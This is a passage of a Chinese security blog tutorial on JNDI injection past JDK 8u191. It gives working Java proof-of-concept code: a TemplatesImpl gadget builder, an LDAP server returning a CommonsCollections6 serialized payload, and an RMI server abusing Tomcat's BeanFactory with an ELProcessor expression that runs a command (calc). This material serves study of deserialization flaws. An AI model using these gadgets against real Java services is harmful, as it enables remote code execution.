<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo2.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Utils</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(obj.getClass().getName());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> clazz.getDeclaredField(field);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TemplatesImpl <span class="title function_">creatTemplatesImpl</span><span class="params">(Class payloadClass)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(payloadClass));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.get(payloadClass.getName());</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = clazz.toBytecode();	</span><br><span class="line">        <span class="comment">// templatesImpl</span></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;pwn&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytecodes&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> templates;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="其他注意事项"><a href="#其他注意事项" class="headerlink" title="其他注意事项"></a>其他注意事项</h3><p>执行的恶意类模块必须放在 static里面执行，放在main函数里面是执行不了的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>本质上虽然是利用了LDAP，但是实际上却是利用了序列化的数据。</p>
<p>先看调用链</p>
<blockquote>
<p>注：我一开始使用的版本是 8u282，调的时候总感觉有些问题，和师傅们调的不一样，后来换了8u202好点了。虽然8u282也能顺下来，但因为jdk版本升级，底层变动，其实路子还是相对比较复杂了。因为8u282调的时候，一开始不是lookup方法，所以比较难理解。人生建议选择低版本jdk，否则回怀疑人生</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(ObjectInputStream#readObject --&gt; ... --&gt; Runtime.getRuntime.exec(<span class="string">&#x27;calc&#x27;</span>))</span><br><span class="line">deserializeObject:<span class="number">528</span>, Obj (com.sun.jndi.ldap)</span><br><span class="line">decodeObject:<span class="number">239</span>, Obj (com.sun.jndi.ldap)</span><br><span class="line">c_lookup:<span class="number">1051</span>, LdapCtx (com.sun.jndi.ldap)</span><br><span class="line">p_lookup:<span class="number">542</span>, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">177</span>, PartialCompositeContext (com.sun.jndi.toolkit.ctx)</span><br><span class="line">lookup:<span class="number">205</span>, GenericURLContext (com.sun.jndi.toolkit.url)</span><br><span class="line">lookup:<span class="number">94</span>, ldapURLContext (com.sun.jndi.url.ldap)</span><br><span class="line">lookup:<span class="number">417</span>, InitialContext (javax.naming)</span><br><span class="line">main:<span class="number">8</span>, JNDIClient (JNDI.bypass1)</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211229143751.png"></p>
<p>在其中的<code>JAVA_ATTRIBUTES</code>中，我们可以看到其定义</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> String[] JAVA_ATTRIBUTES = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaSerializedData&quot;</span>, <span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;javaFactory&quot;</span>, <span class="string">&quot;javaCodeBase&quot;</span>, <span class="string">&quot;javaReferenceAddress&quot;</span>, <span class="string">&quot;javaClassNames&quot;</span>, <span class="string">&quot;javaRemoteLocation&quot;</span>&#125;;</span><br></pre></td></tr></table></figure>

<p>这里的<code>var0</code>是LDAP服务器端发送给<code>Attributes</code>(我们可控)，所以我们可以在服务器端把这个属性与恶意的类进行绑定</p>
<p>在我们构造的LDAPServer中，我们把<code>JAVA_Attributes</code>中的<code>javaSerializeData</code>进行一个绑定。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, getCommonsCollections6());</span><br></pre></td></tr></table></figure>

<p>然后进行直接进行反序列化。</p>
<p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20211229164212.png"></p>
<h3 id="本地Factory绕过-RMI"><a href="#本地Factory绕过-RMI" class="headerlink" title="本地Factory绕过(RMI)"></a>本地Factory绕过(RMI)</h3><p>&#x3D;&#x3D;稍微有些苛刻&#x3D;&#x3D;</p>
<p>在 Reference 类中的 factory Class，要求实现 ObjectFactory 接⼝，</p>
<p>在 “NamingManager#getObjectFactoryFromReference” ⽅法中的逻辑是这样的：</p>
<ol>
<li>优先本地加载factory，这就要求factoryClass在 本地的Classpath中</li>
<li>本地加载不会从codebase中加载，但是由于⾼版本 jdk 默认不信任 codebase，在⼀般情况 下⽆法利⽤</li>
<li>在加载完 factory 之后会强制类型转换为 javax.naming.spi.ObjectFactory 接⼝类型， 之后调⽤ factory.getObjectInstance() ⽅法</li>
</ol>
<p>所以，如果找可以利用的factory就满足以下要求：</p>
<ul>
<li>在目标的ClassPath中，且实现了 javax.naming.spi.ObjectFactory 接⼝</li>
<li>其 getObjectInstance ⽅法可以被利⽤</li>
</ul>
<p>这个可⽤的 factory 类为 org.apache.naming.BeanFactory ，位于 tomcat 的依赖包中，此 外，这个 factory 绕过需要搭配 javax.el.ELProcessor 来完成 RCE，依赖：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-catalina<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span><span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span><span class="comment">&lt;!-- 加载ELProcessor时需要 --&gt;</span><span class="tag">&lt;<span class="name">dependency</span>&gt;</span><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-el<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span><span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>来到<code>BeanFactory#getObjectInstance</code>方法中，(太长省略)</p>
<p>这里的代码逻辑比较复杂，简单可以概括为以下几点：</p>
<ol>
<li><code>BeanFactory#getObjectInstance</code> 要求传入Referrnce必须为<code>ResourceRef</code>的实例</li>
<li><code>BeanFactory</code>通过反射创建了一个bean，这个Bean的类名，属性，属性值都来自于<code>Reference</code>，我们可控。</li>
<li>在注入Bean的属性的时候，会调用对应的setter方法。这个setter方法不一定要是<code>set...</code>，我们通过<code>ResourceRef</code>对象中的<code>forceString</code>，可以把任意的<code>public</code>方法转换为该属性的<code>setter</code>方法。</li>
<li>这个方法的参数类型必须是<code>String.class</code></li>
</ol>
<p>我们可以利用的方法为<code>javax.el.ELProceor#eval</code>方法，可以执行任意EL表达式</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo03;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">StringRefAddr</span> <span class="variable">sr1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;X=eval&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">el</span> <span class="operator">=</span> <span class="string">&quot;&#x27;&#x27;.getClass().forName(&#x27;javax.script.ScriptEngineManager&#x27;).newInstance().getEngineByName(&#x27;JavaScript&#x27;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;]).start()\&quot;)&quot;</span>;</span><br><span class="line">        <span class="type">StringRefAddr</span> <span class="variable">sr2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;X&quot;</span>, el);</span><br><span class="line">        ref.add(sr1);</span><br><span class="line">        ref.add(sr2);</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">        registry.bind(<span class="string">&quot;Calc&quot;</span>, referenceWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo03;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;rmi://localhost:1099/Calc&quot;</span>;</span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        context.lookup(url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">h0ld1rs</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://h0ld1rs.github.io/posts/3525.html">https://h0ld1rs.github.io/posts/3525.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://h0ld1rs.github.io" target="_blank">h0ld1rs的博客</a>！</span></div></div><div class="tag_share"><div class="post_share"><div class="social-share" data-image="/img/image/13.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/61606.html"><img class="prev-cover" src="/img/image/2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Go渗透测试笔记(一)</div></div></a></div><div class="next-post pull-right"><a href="/posts/20008.html"><img class="next-cover" src="/img/image/12.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">JDBC反序列化漏洞</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/20008.html" title="JDBC反序列化漏洞"><img class="cover" src="/img/image/12.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-25</div><div class="title">JDBC反序列化漏洞</div></div></a></div><div><a href="/posts/22734.html" title="java安全入门(二)--CC链"><img class="cover" src="/img/image/11.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-15</div><div class="title">java安全入门(二)--CC链</div></div></a></div><div><a href="/posts/39073.html" title="java安全入门(一)"><img class="cover" src="/img/image/10.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-13</div><div class="title">java安全入门(一)</div></div></a></div><div><a href="/posts/42607.html" title="java字节码加载的相关笔记"><img class="cover" src="/img/image/9.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-03-11</div><div class="title">java字节码加载的相关笔记</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/1.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">h0ld1rs</div><div class="author-info__description">希望能认识更多师傅，学到更多东西</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">14</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/h0ld1rs"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#JNDI%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97"><span class="toc-number">1.</span> <span class="toc-text">JNDI入门指北</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">前言</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RPC"><span class="toc-number">2.</span> <span class="toc-text">RPC</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%81%94%E7%B3%BB"><span class="toc-number">3.</span> <span class="toc-text">联系</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="toc-number">3.1.</span> <span class="toc-text">使用场景</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BE%AE%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.</span> <span class="toc-text">微服务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E4%BD%BF%E7%94%A8%E5%BE%AE%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.1.</span> <span class="toc-text">为什么要使用微服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Ejdk%E7%89%88%E6%9C%AC%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-number">4.1.1.</span> <span class="toc-text">关于jdk版本的问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%82%A3%E4%B9%88%EF%BC%8C%E4%B8%BA%E4%BB%80%E4%B9%88191%E5%92%8C113%E6%98%AF%E4%B8%80%E4%B8%AA%E5%88%86%E6%B0%B4%E5%B2%AD%E5%91%A2%EF%BC%9F"><span class="toc-number">4.2.</span> <span class="toc-text">那么，为什么191和113是一个分水岭呢？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-JNDI%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%B1%BB"><span class="toc-number">4.2.1.</span> <span class="toc-text">LDAP+JNDI远程加载恶意类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI"><span class="toc-number">4.2.2.</span> <span class="toc-text">JNDI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1"><span class="toc-number">4.2.3.</span> <span class="toc-text">LDAP目录服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI"><span class="toc-number">4.2.4.</span> <span class="toc-text">RMI</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%B1%BB-%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">4.3.</span> <span class="toc-text">远程加载恶意类(攻击服务端)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%B1%BB"><span class="toc-number">4.3.1.</span> <span class="toc-text">RMI服务端远程加载恶意类</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BB%A1%E8%B6%B3%E6%9D%A1%E4%BB%B6"><span class="toc-number">4.3.1.1.</span> <span class="toc-text">满足条件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI-JNDI%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%B1%BB"><span class="toc-number">4.3.2.</span> <span class="toc-text">RMI+JNDI远程加载恶意类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-JNDI%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%81%B6%E6%84%8F%E7%B1%BB-1"><span class="toc-number">4.3.3.</span> <span class="toc-text">LDAP+JNDI远程加载恶意类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E4%B9%8B-rmi-jndi"><span class="toc-number">4.3.4.</span> <span class="toc-text">JNDI注入之 rmi+jndi</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">4.3.4.1.</span> <span class="toc-text">服务端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#RMI-1"><span class="toc-number">4.3.4.2.</span> <span class="toc-text">RMI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E4%B8%8E%E6%B3%A8%E5%86%8C%E4%B8%AD%E5%BF%83"><span class="toc-number">4.3.4.3.</span> <span class="toc-text">服务端与注册中心</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E5%89%8D%E7%BD%AE"><span class="toc-number">4.3.5.</span> <span class="toc-text">JNDI注入前置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">4.3.5.1.</span> <span class="toc-text">客户端</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5%E7%9A%84%E6%A0%B9%E2%80%93Reference"><span class="toc-number">4.3.5.2.</span> <span class="toc-text">JNDI注入的根–Reference</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A58u191%E2%86%93"><span class="toc-number">4.4.</span> <span class="toc-text">JNDI注入8u191↓</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI%EF%BC%888u121%EF%BC%89"><span class="toc-number">4.4.1.</span> <span class="toc-text">RMI（8u121）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">4.4.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">4.4.3.</span> <span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP%E6%96%B9%E5%BC%8F"><span class="toc-number">4.5.</span> <span class="toc-text">LDAP方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E5%88%86%E6%9E%90"><span class="toc-number">4.5.1.</span> <span class="toc-text">简单分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="toc-number">4.5.2.</span> <span class="toc-text">修复</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JNDI%E6%B3%A8%E5%85%A5-8u191%E2%86%91"><span class="toc-number">4.6.</span> <span class="toc-text">JNDI注入 8u191↑</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E8%BF%94%E5%9B%9E%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE-LDAP"><span class="toc-number">4.6.1.</span> <span class="toc-text">直接返回序列化数据(LDAP)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">4.6.2.</span> <span class="toc-text">其他注意事项</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">4.6.3.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0Factory%E7%BB%95%E8%BF%87-RMI"><span class="toc-number">4.6.4.</span> <span class="toc-text">本地Factory绕过(RMI)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-2"><span class="toc-number">4.7.</span> <span class="toc-text">分析</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/7090.html" title="codeql入门"><img src="/img/image/14.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="codeql入门"/></a><div class="content"><a class="title" href="/posts/7090.html" title="codeql入门">codeql入门</a><time datetime="2022-03-14T03:11:58.000Z" title="发表于 2022-03-14 11:11:58">2022-03-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/42607.html" 